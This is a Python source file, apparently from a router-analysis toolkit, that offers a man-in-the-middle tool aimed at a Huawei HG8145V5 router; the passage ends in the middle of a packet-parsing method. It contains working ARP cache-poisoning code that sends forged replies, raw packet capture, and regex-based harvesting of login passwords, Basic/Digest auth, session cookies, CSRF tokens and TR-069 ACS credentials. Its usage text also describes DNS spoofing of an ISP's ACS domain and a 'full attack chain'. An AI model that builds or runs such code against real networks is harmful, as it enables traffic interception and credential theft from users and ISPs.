#!/usr/bin/env python3
"""
Network Traffic Capture & ARP Spoofing Tool
for Huawei HG8145V5 Router Analysis

Intercepts, captures and analyses network traffic between the Huawei
HG8145V5 router and connected clients or the upstream ISP ACS server.
Combines ARP cache-poisoning, passive packet capture, credential
extraction, CWMP/TR-069 dissection, DNS spoofing and port scanning into
a single standard-library-only toolkit that runs on Windows.

Usage examples
--------------
    # Scan the router for open ports
    python tools/traffic_capture.py --mode scan --router-ip 192.168.100.1

    # Passive capture on the local segment
    python tools/traffic_capture.py --mode capture --router-ip 192.168.100.1 \\
        --our-ip 192.168.100.50 --output captures/ --duration 120

    # ARP spoof + capture (requires Administrator)
    python tools/traffic_capture.py --mode arp-spoof --router-ip 192.168.100.1 \\
        --gateway-ip 192.168.100.1 --our-ip 192.168.100.50 --interface eth0

    # DNS spoofing to redirect ACS traffic to local TR-069 server
    python tools/traffic_capture.py --mode dns-spoof --router-ip 192.168.100.1 \\
        --acs-domain acs.isp.com --redirect-ip 192.168.100.50

    # Full attack chain
    python tools/traffic_capture.py --mode full --router-ip 192.168.100.1 \\
        --gateway-ip 192.168.100.1 --our-ip 192.168.100.50 \\
        --acs-domain acs.isp.com --redirect-ip 192.168.100.50 \\
        --output captures/ --duration 300

Note
----
Raw sockets on Windows require Administrator privileges.  The tool will
detect an unprivileged context and exit with a clear error message.

ARP spoofing (modes ``arp-spoof`` and ``full``) requires raw Ethernet
frame injection which is **not possible** on Windows through the Python
standard library alone — Npcap or an equivalent driver is needed.  On
Windows these modes will warn and skip frame transmission; all other
functionality (capture, scanning, DNS spoofing) works normally.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import collections
import copy
import ctypes
import enum
import functools
import hashlib
import io
import ipaddress
import json
import logging
import os
import re
import socket
import struct
import sys
import textwrap
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, unquote_plus

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("traffic_capture")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

ROUTER_PORTS: Dict[int, str] = {
    22: "SSH",
    23: "Telnet",
    53: "DNS",
    80: "HTTP",
    443: "HTTPS",
    7547: "TR-069",
    8080: "Alt-HTTP",
    8443: "Alt-HTTPS",
    30005: "OMCI",
    37215: "HW-API",
}

INTERESTING_PORTS: Set[int] = {22, 23, 53, 80, 443, 7547}

# Ethernet / ARP protocol numbers
ETH_P_ALL = 0x0003
ETH_P_ARP = 0x0806
ETH_P_IP = 0x0800
ARP_OP_REQUEST = 1
ARP_OP_REPLY = 2
ARP_HW_TYPE_ETHERNET = 1

BROADCAST_MAC = b"\xff\xff\xff\xff\xff\xff"
NULL_MAC = "00:00:00:00:00:00"

# Used for local-IP detection via a non-routed UDP connect
_IP_DETECTION_TARGET = "8.8.8.8"  # used only for local IP detection via UDP connect

# IP protocol numbers
IPPROTO_TCP = 6
IPPROTO_UDP = 17

# DNS
DNS_PORT = 53

# Packet-rate limiter — 500 pps avoids overwhelming the NIC / host while
# still capturing the vast majority of traffic on a typical LAN segment.
MAX_PPS = 500

# ARP spoof interval (seconds)
ARP_SPOOF_INTERVAL = 2.0

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _mac_bytes(mac_str: str) -> bytes:
    """Convert 'aa:bb:cc:dd:ee:ff' → 6-byte bytes."""
    return binascii.unhexlify(mac_str.replace(":", "").replace("-", ""))


def _mac_str(mac_bytes: bytes) -> str:
    """Convert 6-byte MAC → 'aa:bb:cc:dd:ee:ff'."""
    return ":".join(f"{b:02x}" for b in mac_bytes)


def _ip_bytes(ip_str: str) -> bytes:
    """Convert dotted-quad IP string → 4 bytes."""
    return socket.inet_aton(ip_str)


def _ip_str(ip_bytes: bytes) -> str:
    """Convert 4-byte IP → dotted-quad string."""
    return socket.inet_ntoa(ip_bytes)


def _is_admin() -> bool:
    """Return *True* if the process is running with elevated privileges."""
    if sys.platform == "win32":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0  # type: ignore[union-attr]
        except AttributeError:
            return False
    else:
        return os.geteuid() == 0  # type: ignore[attr-defined]


def _ensure_output_dir(path: Path) -> Path:
    path.mkdir(parents=True, exist_ok=True)
    return path


def _timestamp() -> str:
    return datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")


def _save_json(data: Any, filepath: Path) -> None:
    """Serialise *data* to a JSON file, handling non-serialisable types."""

    def _default(obj: Any) -> Any:
        if isinstance(obj, bytes):
            return base64.b64encode(obj).decode()
        if isinstance(obj, datetime):
            return obj.isoformat()
        if isinstance(obj, set):
            return sorted(obj)
        return str(obj)

    with open(filepath, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, default=_default)
    log.info("Saved %s", filepath)


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------


@dataclass
class CapturedCredential:
    """A single credential extracted from network traffic."""

    timestamp: str
    source_ip: str
    dest_ip: str
    cred_type: str  # "http-login", "basic-auth", "digest-auth", "tr069-acs", "cookie", "hw-token"
    username: str = ""
    password: str = ""
    password_raw: str = ""  # original (e.g. base64) form before decoding
    extra: Dict[str, str] = field(default_factory=dict)

    def as_dict(self) -> Dict[str, Any]:
        return {
            "timestamp": self.timestamp,
            "source_ip": self.source_ip,
            "dest_ip": self.dest_ip,
            "type": self.cred_type,
            "username": self.username,
            "password": self.password,
            "password_raw": self.password_raw,
            "extra": self.extra,
        }


@dataclass
class CapturedPacket:
    """Minimal parsed representation of a captured packet."""

    timestamp: str
    src_mac: str
    dst_mac: str
    src_ip: str = ""
    dst_ip: str = ""
    protocol: str = ""
    src_port: int = 0
    dst_port: int = 0
    payload: bytes = b""
    info: str = ""

    def as_dict(self) -> Dict[str, Any]:
        return {
            "timestamp": self.timestamp,
            "src_mac": self.src_mac,
            "dst_mac": self.dst_mac,
            "src_ip": self.src_ip,
            "dst_ip": self.dst_ip,
            "protocol": self.protocol,
            "src_port": self.src_port,
            "dst_port": self.dst_port,
            "payload_b64": base64.b64encode(self.payload).decode() if self.payload else "",
            "info": self.info,
        }


@dataclass
class ScanResult:
    """Result for a single port probe."""

    port: int
    service: str
    state: str  # "open", "closed", "filtered"
    banner: str = ""

    def as_dict(self) -> Dict[str, Any]:
        return {
            "port": self.port,
            "service": self.service,
            "state": self.state,
            "banner": self.banner,
        }


# ---------------------------------------------------------------------------
# ARP Spoofing Engine
# ---------------------------------------------------------------------------


class ARPSpoofer:
    """
    ARP cache poisoning to redirect traffic from router through this machine.

    Attack flow:
    1. Get our own MAC address and IP
    2. Get router's MAC via ARP request
    3. Get target's MAC via ARP request (optional, for targeted MITM)
    4. Send forged ARP replies:
       - Tell router: "target IP is at our MAC"
       - Tell target: "router IP is at our MAC"
    5. Forward packets between them (IP forwarding)
    6. Capture and analyse traffic in transit

    Raw sockets on Windows require Administrator privileges.  On Linux
    ``AF_PACKET`` sockets need ``CAP_NET_RAW`` or root.
    """

    def __init__(
        self,
        our_ip: str,
        our_mac: str,
        router_ip: str,
        target_ip: Optional[str] = None,
        interface: str = "eth0",
    ) -> None:
        self.our_ip = our_ip
        self.our_mac = our_mac
        self.router_ip = router_ip
        self.target_ip = target_ip
        self.interface = interface

        self.router_mac: Optional[str] = None
        self.target_mac: Optional[str] = None

        self._stop_event = threading.Event()
        self._spoof_thread: Optional[threading.Thread] = None
        self._sock: Optional[socket.socket] = None

    # -- raw socket helpers --------------------------------------------------

    def _open_raw_socket(self) -> socket.socket:
        """Open a raw socket suitable for sending Ethernet frames."""
        if sys.platform == "win32":
            # Windows: raw IP socket — Ethernet-level framing is not
            # directly available via the standard library.  We use
            # IPPROTO_IP with SIO_RCVALL for sniffing, but *sending*
            # ARP frames requires either Npcap or WinDivert.  Here we
            # create a raw IP socket and document the limitation.
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sock.bind((self.our_ip, 0))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            # Enable promiscuous mode via SIO_RCVALL
            try:
                sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  # type: ignore[attr-defined]
            except OSError as exc:
                log.warning("SIO_RCVALL failed (need Administrator): %s", exc)
            log.info("Opened Windows raw IP socket on %s", self.our_ip)
            return sock
        else:
            # Linux: AF_PACKET gives full Ethernet frame access.
            sock = socket.socket(
                socket.AF_PACKET,  # type: ignore[attr-defined]
                socket.SOCK_RAW,
                socket.htons(ETH_P_ALL),
            )
            sock.bind((self.interface, 0))
            log.info("Opened AF_PACKET socket on %s", self.interface)
            return sock

    def _close_raw_socket(self) -> None:
        if self._sock is None:
            return
        if sys.platform == "win32":
            try:
                self._sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)  # type: ignore[attr-defined]
            except Exception:
                pass
        try:
            self._sock.close()
        except Exception:
            pass
        self._sock = None

    # -- frame construction --------------------------------------------------

    @staticmethod
    def build_arp_packet(
        src_mac: bytes,
        dst_mac: bytes,
        src_ip: bytes,
        dst_ip: bytes,
        opcode: int = ARP_OP_REPLY,
    ) -> bytes:
        """
        Build a raw Ethernet + ARP frame.

        Ethernet header (14 bytes):
            dst_mac (6) | src_mac (6) | ethertype 0x0806 (2)
        ARP payload (28 bytes):
            hw_type (2) | proto_type (2) | hw_size (1) | proto_size (1) |
            opcode (2) | sender_mac (6) | sender_ip (4) |
            target_mac (6) | target_ip (4)
        """
        eth_header = struct.pack(
            "!6s6sH",
            dst_mac,
            src_mac,
            ETH_P_ARP,
        )
        arp_payload = struct.pack(
            "!HHBBH6s4s6s4s",
            ARP_HW_TYPE_ETHERNET,  # hardware type
            ETH_P_IP,  # protocol type
            6,  # hardware address length
            4,  # protocol address length
            opcode,
            src_mac,
            src_ip,
            dst_mac,
            dst_ip,
        )
        return eth_header + arp_payload

    @staticmethod
    def build_arp_request(src_mac: bytes, src_ip: bytes, target_ip: bytes) -> bytes:
        """Build an ARP *who-has* request (broadcast)."""
        return ARPSpoofer.build_arp_packet(
            src_mac=src_mac,
            dst_mac=BROADCAST_MAC,
            src_ip=src_ip,
            dst_ip=target_ip,
            opcode=ARP_OP_REQUEST,
        )

    # -- MAC resolution ------------------------------------------------------

    def _resolve_mac(self, target_ip: str, timeout: float = 5.0) -> Optional[str]:
        """
        Send an ARP request and wait for a reply to learn *target_ip*'s MAC.

        On Windows (where AF_PACKET is unavailable) we fall back to reading
        the system ARP table via ``arp -a``.
        """
        if sys.platform == "win32":
            return self._resolve_mac_windows(target_ip, timeout)
        return self._resolve_mac_linux(target_ip, timeout)

    def _resolve_mac_linux(self, target_ip: str, timeout: float) -> Optional[str]:
        """Use a raw ARP request on Linux."""
        sock = socket.socket(
            socket.AF_PACKET,  # type: ignore[attr-defined]
            socket.SOCK_RAW,
            socket.htons(ETH_P_ARP),
        )
        sock.bind((self.interface, 0))
        sock.settimeout(timeout)

        our_mac_b = _mac_bytes(self.our_mac)
        our_ip_b = _ip_bytes(self.our_ip)
        target_ip_b = _ip_bytes(target_ip)

        request = self.build_arp_request(our_mac_b, our_ip_b, target_ip_b)
        sock.send(request)
        log.debug("ARP who-has %s sent on %s", target_ip, self.interface)

        deadline = time.monotonic() + timeout
        try:
            while time.monotonic() < deadline:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                sock.settimeout(remaining)
                try:
                    raw = sock.recv(65535)
                except socket.timeout:
                    break
                if len(raw) < 42:
                    continue
                eth_type = struct.unpack("!H", raw[12:14])[0]
                if eth_type != ETH_P_ARP:
                    continue
                arp_op = struct.unpack("!H", raw[20:22])[0]
                if arp_op != ARP_OP_REPLY:
                    continue
                sender_ip = _ip_str(raw[28:32])
                if sender_ip == target_ip:
                    sender_mac = _mac_str(raw[22:28])
                    log.info("ARP reply: %s is at %s", target_ip, sender_mac)
                    sock.close()
                    return sender_mac
        finally:
            sock.close()

        log.warning("ARP resolution for %s timed out after %.1fs", target_ip, timeout)
        return None

    @staticmethod
    def _resolve_mac_windows(target_ip: str, timeout: float) -> Optional[str]:
        """
        Ping then read the Windows ARP table.

        We ping first to ensure the host is in the ARP cache, then parse
        ``arp -a`` output.
        """
        # Trigger ARP entry via a simple connect attempt
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.0)
            s.sendto(b"", (target_ip, 1))
            s.close()
        except Exception:
            pass
        time.sleep(0.5)

        import subprocess  # noqa: delayed import — only needed on Windows fallback

        try:
            out = subprocess.check_output(["arp", "-a"], text=True, timeout=timeout)
        except Exception as exc:
            log.warning("arp -a failed: %s", exc)
            return None

        for line in out.splitlines():
            if target_ip in line:
                parts = line.split()
                for part in parts:
                    if re.match(r"([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}", part):
                        mac = part.replace("-", ":").lower()
                        log.info("ARP table: %s → %s", target_ip, mac)
                        return mac
        log.warning("Could not find %s in ARP table", target_ip)
        return None

    # -- spoofing ------------------------------------------------------------

    def start(self) -> None:
        """Begin ARP spoofing in a background thread."""
        if not _is_admin():
            log.error(
                "ARP spoofing requires Administrator/root privileges. "
                "Please re-run with elevated permissions."
            )
            return

        self._sock = self._open_raw_socket()

        # Resolve MACs
        log.info("Resolving router MAC for %s …", self.router_ip)
        self.router_mac = self._resolve_mac(self.router_ip)
        if self.router_mac is None:
            log.error("Cannot resolve router MAC — aborting ARP spoof.")
            self._close_raw_socket()
            return

        if self.target_ip:
            log.info("Resolving target MAC for %s …", self.target_ip)
            self.target_mac = self._resolve_mac(self.target_ip)
            if self.target_mac is None:
                log.warning(
                    "Cannot resolve target MAC for %s; will only poison router→us.",
                    self.target_ip,
                )

        self._stop_event.clear()
        self._spoof_thread = threading.Thread(
            target=self._spoof_loop, daemon=True, name="arp-spoof"
        )
        self._spoof_thread.start()
        log.info("ARP spoofing started.")

    def _spoof_loop(self) -> None:
        """Periodically send forged ARP replies."""
        our_mac_b = _mac_bytes(self.our_mac)
        our_ip_b = _ip_bytes(self.our_ip)
        router_ip_b = _ip_bytes(self.router_ip)

        router_mac_b = _mac_bytes(self.router_mac)  # type: ignore[arg-type]
        target_mac_b = _mac_bytes(self.target_mac) if self.target_mac else None
        target_ip_b = _ip_bytes(self.target_ip) if self.target_ip else None

        while not self._stop_event.is_set():
            try:
                # Tell router: target IP is at our MAC
                if target_ip_b is not None:
                    pkt = self.build_arp_packet(
                        src_mac=our_mac_b,
                        dst_mac=router_mac_b,
                        src_ip=target_ip_b,
                        dst_ip=router_ip_b,
                        opcode=ARP_OP_REPLY,
                    )
                    self._send_frame(pkt)
                    log.debug(
                        "ARP poison → router: %s is-at %s", self.target_ip, self.our_mac
                    )

                # Tell target: router IP is at our MAC
                if target_mac_b is not None and target_ip_b is not None:
                    pkt = self.build_arp_packet(
                        src_mac=our_mac_b,
                        dst_mac=target_mac_b,
                        src_ip=router_ip_b,
                        dst_ip=target_ip_b,
                        opcode=ARP_OP_REPLY,
                    )
                    self._send_frame(pkt)
                    log.debug(
                        "ARP poison → target: %s is-at %s", self.router_ip, self.our_mac
                    )

                # If no explicit target, just poison the router to send us
                # all traffic destined for the gateway.
                if target_ip_b is None:
                    # Gratuitous ARP: tell everyone we are the gateway
                    pkt = self.build_arp_packet(
                        src_mac=our_mac_b,
                        dst_mac=BROADCAST_MAC,
                        src_ip=router_ip_b,
                        dst_ip=router_ip_b,
                        opcode=ARP_OP_REPLY,
                    )
                    self._send_frame(pkt)
                    log.debug("Gratuitous ARP: %s is-at %s", self.router_ip, self.our_mac)

            except Exception as exc:
                log.error("ARP spoof send error: %s", exc)

            self._stop_event.wait(ARP_SPOOF_INTERVAL)

    def _send_frame(self, frame: bytes) -> None:
        """Send a raw Ethernet frame via the open socket."""
        if self._sock is None:
            return
        try:
            if sys.platform == "win32":
                # Windows raw IP socket cannot send Ethernet frames
                # directly.  Sending ARP frames requires Npcap or WinDivert.
                log.warning(
                    "(win32) Cannot send raw Ethernet frames via the standard "
                    "library — ARP spoofing is non-functional on Windows without "
                    "Npcap.  Frame (%d bytes) was built but not sent.",
                    len(frame),
                )
            else:
                self._sock.send(frame)
        except OSError as exc:
            log.error("send_frame: %s", exc)

    # -- restore / cleanup ---------------------------------------------------

    def restore(self) -> None:
        """Restore the original ARP entries for router and target."""
        if self.router_mac is None:
            return

        router_mac_b = _mac_bytes(self.router_mac)
        router_ip_b = _ip_bytes(self.router_ip)

        if self.target_mac and self.target_ip:
            target_mac_b = _mac_bytes(self.target_mac)
            target_ip_b = _ip_bytes(self.target_ip)

            # Restore router's ARP: target is at target's real MAC
            restore_router = self.build_arp_packet(
                src_mac=target_mac_b,
                dst_mac=router_mac_b,
                src_ip=target_ip_b,
                dst_ip=router_ip_b,
                opcode=ARP_OP_REPLY,
            )
            # Restore target's ARP: router is at router's real MAC
            restore_target = self.build_arp_packet(
                src_mac=router_mac_b,
                dst_mac=target_mac_b,
                src_ip=router_ip_b,
                dst_ip=target_ip_b,
                opcode=ARP_OP_REPLY,
            )
            for _ in range(5):
                self._send_frame(restore_router)
                self._send_frame(restore_target)
                time.sleep(0.3)
            log.info("ARP tables restored (router ↔ target).")
        else:
            # Restore gateway
            restore = self.build_arp_packet(
                src_mac=router_mac_b,
                dst_mac=BROADCAST_MAC,
                src_ip=router_ip_b,
                dst_ip=router_ip_b,
                opcode=ARP_OP_REPLY,
            )
            for _ in range(5):
                self._send_frame(restore)
                time.sleep(0.3)
            log.info("ARP table restored (gateway broadcast).")

    def stop(self) -> None:
        """Stop spoofing and restore ARP tables."""
        self._stop_event.set()
        if self._spoof_thread is not None:
            self._spoof_thread.join(timeout=5.0)
        try:
            self.restore()
        finally:
            self._close_raw_socket()
        log.info("ARP spoofer stopped.")


# ---------------------------------------------------------------------------
# Credential Extractor
# ---------------------------------------------------------------------------


class CredentialExtractor:
    """
    Extract credentials from captured HTTP traffic.

    Patterns to match:
    - PassWord= in POST body → base64 decode
    - UserName= in POST body
    - Cookie: header values
    - x.X_HW_Token in POST body
    - HTTP Basic/Digest auth headers
    - TR-069 ACS credentials in SOAP XML
    """

    _BASIC_AUTH_RE = re.compile(
        r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.IGNORECASE
    )
    _DIGEST_AUTH_RE = re.compile(
        r'Authorization:\s*Digest\s+(.+?)(?:\r?\n(?!\s)|\Z)', re.IGNORECASE | re.DOTALL
    )
    _COOKIE_RE = re.compile(r"(?:Set-)?Cookie:\s*(.+?)(?:\r?\n(?!\s)|\Z)", re.IGNORECASE)
    _HW_TOKEN_RE = re.compile(r"x\.X_HW_Token=([^&\s\r\n]+)", re.IGNORECASE)
    _USERNAME_RE = re.compile(r"UserName=([^&\s\r\n]+)", re.IGNORECASE)
    _PASSWORD_RE = re.compile(r"PassWord=([^&\s\r\n]+)", re.IGNORECASE)
    _ACS_USER_RE = re.compile(
        r"<(?:\w+:)?Username>([^<]+)</(?:\w+:)?Username>", re.IGNORECASE
    )
    _ACS_PASS_RE = re.compile(
        r"<(?:\w+:)?Password>([^<]+)</(?:\w+:)?Password>", re.IGNORECASE
    )

    def __init__(self) -> None:
        self.credentials: List[CapturedCredential] = []
        self._lock = threading.Lock()

    def extract(self, pkt: CapturedPacket) -> List[CapturedCredential]:
        """
        Analyse *pkt* payload for credentials. Returns any found creds.
        """
        found: List[CapturedCredential] = []
        try:
            text = pkt.payload.decode("utf-8", errors="replace")
        except Exception:
            return found

        ts = pkt.timestamp

        # --- HTTP POST login (V-01: base64-encoded password) ---------------
        user_m = self._USERNAME_RE.search(text)
        pass_m = self._PASSWORD_RE.search(text)
        if pass_m:
            raw_pw = unquote_plus(pass_m.group(1))
            decoded_pw = self._try_base64_decode(raw_pw)
            username = unquote_plus(user_m.group(1)) if user_m else ""
            cred = CapturedCredential(
                timestamp=ts,
                source_ip=pkt.src_ip,
                dest_ip=pkt.dst_ip,
                cred_type="http-login",
                username=username,
                password=decoded_pw,
                password_raw=raw_pw,
            )
            found.append(cred)
            log.warning("CREDENTIAL http-login: user=%s pass=%s", username, decoded_pw)

        # --- HTTP Basic auth -----------------------------------------------
        for m in self._BASIC_AUTH_RE.finditer(text):
            decoded = self._try_base64_decode(m.group(1))
            parts = decoded.split(":", 1)
            cred = CapturedCredential(
                timestamp=ts,
                source_ip=pkt.src_ip,
                dest_ip=pkt.dst_ip,
                cred_type="basic-auth",
                username=parts[0] if parts else "",
                password=parts[1] if len(parts) > 1 else "",
                password_raw=m.group(1),
            )
            found.append(cred)
            log.warning("CREDENTIAL basic-auth: %s", decoded)

        # --- HTTP Digest auth ----------------------------------------------
        for m in self._DIGEST_AUTH_RE.finditer(text):
            cred = CapturedCredential(
                timestamp=ts,
                source_ip=pkt.src_ip,
                dest_ip=pkt.dst_ip,
                cred_type="digest-auth",
                extra={"raw": m.group(1).strip()},
            )
            found.append(cred)
            log.warning("CREDENTIAL digest-auth captured")

        # --- Cookie / session tokens ---------------------------------------
        for m in self._COOKIE_RE.finditer(text):
            cred = CapturedCredential(
                timestamp=ts,
                source_ip=pkt.src_ip,
                dest_ip=pkt.dst_ip,
                cred_type="cookie",
                extra={"cookie": m.group(1).strip()},
            )
            found.append(cred)
            log.info("SESSION cookie: %s", m.group(1).strip()[:80])

        # --- X_HW_Token (anti-CSRF) ----------------------------------------
        for m in self._HW_TOKEN_RE.finditer(text):
            cred = CapturedCredential(
                timestamp=ts,
                source_ip=pkt.src_ip,
                dest_ip=pkt.dst_ip,
                cred_type="hw-token",
                extra={"token": unquote_plus(m.group(1))},
            )
            found.append(cred)
            log.info("HW_Token: %s", unquote_plus(m.group(1)))

        # --- TR-069 ACS credentials in SOAP XML ----------------------------
        acs_user = self._ACS_USER_RE.search(text)
        acs_pass = self._ACS_PASS_RE.search(text)
        if acs_user or acs_pass:
            cred = CapturedCredential(
                timestamp=ts,
                source_ip=pkt.src_ip,
                dest_ip=pkt.dst_ip,
                cred_type="tr069-acs",
                username=acs_user.group(1) if acs_user else "",
                password=acs_pass.group(1) if acs_pass else "",
            )
            found.append(cred)
            log.warning("CREDENTIAL tr069-acs: user=%s", cred.username)

        with self._lock:
            self.credentials.extend(found)
        return found

    @staticmethod
    def _try_base64_decode(value: str) -> str:
        """Try to base64-decode *value*; return as-is if decoding fails."""
        try:
            decoded = base64.b64decode(value).decode("utf-8", errors="replace")
            # Heuristic: if the decoded result is printable, use it.
            if all(c.isprintable() or c in "\t\r\n" for c in decoded):
                return decoded
        except Exception:
            pass
        return value


# ---------------------------------------------------------------------------
# CWMP / TR-069 Analyser
# ---------------------------------------------------------------------------


class CWMPAnalyzer:
    """
    Parse and analyse TR-069/CWMP SOAP traffic between router and ISP ACS.

    Extracts:
    - ACS URL from ManagementServer.URL
    - Device serial, firmware version
    - All parameter values in GetParameterValuesResponse
    - Configuration changes in SetParameterValues requests
    - Firmware download URLs
    """

    _PARAM_VALUE_RE = re.compile(
        r"<(?:\w+:)?Name>([^<]+)</(?:\w+:)?Name>\s*"
        r"<(?:\w+:)?Value[^>]*>([^<]*)</(?:\w+:)?Value>",
        re.DOTALL,
    )
    _ACS_URL_RE = re.compile(
        r"ManagementServer\.URL</(?:\w+:)?Name>\s*"
        r"<(?:\w+:)?Value[^>]*>([^<]+)</(?:\w+:)?Value>",
        re.DOTALL,
    )
    _SERIAL_RE = re.compile(
        r"DeviceInfo\.SerialNumber</(?:\w+:)?Name>\s*"
        r"<(?:\w+:)?Value[^>]*>([^<]+)</(?:\w+:)?Value>",
        re.DOTALL,
    )
    _FW_RE = re.compile(
        r"DeviceInfo\.SoftwareVersion</(?:\w+:)?Name>\s*"
        r"<(?:\w+:)?Value[^>]*>([^<]+)</(?:\w+:)?Value>",
        re.DOTALL,
    )
    _DOWNLOAD_URL_RE = re.compile(
        r"<(?:\w+:)?URL>([^<]+)</(?:\w+:)?URL>", re.IGNORECASE
    )
    _INFORM_RE = re.compile(r"<(?:\w+:)?Inform[\s>]", re.IGNORECASE)
    _GPV_RESP_RE = re.compile(
        r"<(?:\w+:)?GetParameterValuesResponse[\s>]", re.IGNORECASE
    )
    _SPV_RE = re.compile(r"<(?:\w+:)?SetParameterValues[\s>]", re.IGNORECASE)
    _DOWNLOAD_RE = re.compile(r"<(?:\w+:)?Download[\s>]", re.IGNORECASE)

    def __init__(self) -> None:
        self.acs_url: Optional[str] = None
        self.serial: Optional[str] = None
        self.firmware: Optional[str] = None
        self.parameters: Dict[str, str] = {}
        self.config_changes: List[Dict[str, str]] = []
        self.firmware_urls: List[str] = []
        self._lock = threading.Lock()

    def analyse(self, pkt: CapturedPacket) -> Dict[str, Any]:
        """Parse a CWMP/SOAP payload and return extracted data."""
        result: Dict[str, Any] = {}
        try:
            text = pkt.payload.decode("utf-8", errors="replace")
        except Exception:
            return result

        # Only process if it looks like SOAP / XML
        if "<" not in text or "Envelope" not in text:
            return result

        with self._lock:
            # ACS URL
            m = self._ACS_URL_RE.search(text)
            if m:
                self.acs_url = m.group(1)
                result["acs_url"] = self.acs_url
                log.info("CWMP ACS URL: %s", self.acs_url)

            # Serial
            m = self._SERIAL_RE.search(text)
            if m:
                self.serial = m.group(1)
                result["serial"] = self.serial
                log.info("CWMP Serial: %s", self.serial)

            # Firmware
            m = self._FW_RE.search(text)
            if m:
                self.firmware = m.group(1)
                result["firmware"] = self.firmware
                log.info("CWMP Firmware: %s", self.firmware)

            # Inform
            if self._INFORM_RE.search(text):
                result["message_type"] = "Inform"
                log.info("CWMP Inform message captured")

            # GetParameterValuesResponse
            if self._GPV_RESP_RE.search(text):
                result["message_type"] = "GetParameterValuesResponse"
                for pm in self._PARAM_VALUE_RE.finditer(text):
                    name, value = pm.group(1), pm.group(2)
                    self.parameters[name] = value
                result["parameters"] = dict(self.parameters)
                log.info(
                    "CWMP GetParameterValuesResponse: %d params", len(self.parameters)
                )

            # SetParameterValues
            if self._SPV_RE.search(text):
                result["message_type"] = "SetParameterValues"
                changes: List[Dict[str, str]] = []
                for pm in self._PARAM_VALUE_RE.finditer(text):
                    change = {"name": pm.group(1), "value": pm.group(2)}
                    changes.append(change)
                self.config_changes.extend(changes)
                result["config_changes"] = changes
                log.warning(
                    "CWMP SetParameterValues: %d changes detected", len(changes)
                )

            # Download (firmware)
            if self._DOWNLOAD_RE.search(text):
                result["message_type"] = "Download"
                for dm in self._DOWNLOAD_URL_RE.finditer(text):
                    url = dm.group(1)
                    self.firmware_urls.append(url)
                    result.setdefault("download_urls", []).append(url)
                    log.warning("CWMP Download URL: %s", url)

        return result

    def summary(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "acs_url": self.acs_url,
                "serial": self.serial,
                "firmware": self.firmware,
                "parameter_count": len(self.parameters),
                "config_changes": list(self.config_changes),
                "firmware_urls": list(self.firmware_urls),
            }


# ---------------------------------------------------------------------------
# Packet Capture and Analysis
# ---------------------------------------------------------------------------


class PacketCapture:
    """
    Capture and analyse network packets for HG8145V5 traffic.

    Captures:
    - HTTP traffic to/from router (port 80, 443)
    - TR-069/CWMP traffic (port 7547)
    - Telnet traffic (port 23)
    - SSH traffic (port 22)
    - DNS traffic (port 53)
    """

    def __init__(
        self,
        our_ip: str,
        router_ip: str,
        interface: str = "eth0",
        output_dir: Optional[Path] = None,
    ) -> None:
        self.our_ip = our_ip
        self.router_ip = router_ip
        self.interface = interface
        self.output_dir = output_dir or Path("captures")

        self.credential_extractor = CredentialExtractor()
        self.cwmp_analyzer = CWMPAnalyzer()

        self.packets: List[CapturedPacket] = []
        self.dns_queries: List[Dict[str, Any]] = []
        self.device_macs: Set[str] = set()
        self._lock = threading.Lock()

        self._stop_event = threading.Event()
        self._capture_thread: Optional[threading.Thread] = None
        self._sock: Optional[socket.socket] = None

        # Rate limiter
        self._pkt_count = 0
        self._pkt_window_start = time.monotonic()

    def start(self) -> None:
        """Begin packet capture in a background thread."""
        _ensure_output_dir(self.output_dir)
        self._sock = self._open_capture_socket()
        self._stop_event.clear()
        self._capture_thread = threading.Thread(
            target=self._capture_loop, daemon=True, name="pkt-capture"
        )
        self._capture_thread.start()
        log.info("Packet capture started.")

    def _open_capture_socket(self) -> socket.socket:
        if sys.platform == "win32":
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sock.bind((self.our_ip, 0))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            try:
                sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  # type: ignore[attr-defined]
            except OSError as exc:
                log.warning("SIO_RCVALL requires Administrator: %s", exc)
            return sock
        else:
            sock = socket.socket(
                socket.AF_PACKET,  # type: ignore[attr-defined]
                socket.SOCK_RAW,
                socket.htons(ETH_P_ALL),
            )
            sock.bind((self.interface, 0))
            return sock

    def _capture_loop(self) -> None:
        assert self._sock is not None
        self._sock.settimeout(1.0)

        while not self._stop_event.is_set():
            # Rate limiting
            now = time.monotonic()
            if now - self._pkt_window_start >= 1.0:
                self._pkt_count = 0
                self._pkt_window_start = now
            if self._pkt_count >= MAX_PPS:
                time.sleep(0.01)
                continue

            try:
                raw = self._sock.recv(65535)
            except socket.timeout:
                continue
            except OSError as exc:
                if self._stop_event.is_set():
                    break
                log.error("recv error: %s", exc)
                continue

            self._pkt_count += 1
            self._process_raw(raw)

    # -- packet dissection ---------------------------------------------------

    def _process_raw(self, raw: bytes) -> None:
        """Parse a raw frame/packet and dispatch to analysers."""
        ts = _timestamp()

        if sys.platform == "win32":
            # Windows raw socket yields IP packets (no Ethernet header)
